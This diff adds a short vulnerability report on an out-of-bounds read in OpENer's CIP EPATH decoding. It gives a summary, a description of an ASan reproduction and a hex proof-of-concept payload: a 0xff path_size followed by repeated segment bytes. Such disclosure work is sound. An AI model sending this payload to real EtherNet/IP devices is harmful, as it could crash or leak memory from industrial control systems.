@@ -1,0 +1,14 @@
+Number: 593
+
+Summarize:
+OpENer decodes a CIP EPATH (electronic path) by reading a path_size count byte from the request and then
+walking that many path words — without a remaining-buffer-length argument or bound. A request whose EPATH
+path_size is larger than the actual data walks off the end of the incoming_message receive buffer.
+
+Reproduce:
+Faithful ASan model (poc/opener_epath_oob_read_repro.c): a 300-byte redzoned buffer models the tail of
+incoming_message; buf[0] = 255 (path_size = max), segment type bytes drive the 2-bytes/iteration walk with
+no end check. ASan (poc/OPENER-01-asan.txt): heap-buffer-overflow READ of size 1 past the 300-byte region.
+
+Payload:
+ff 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01 20 01
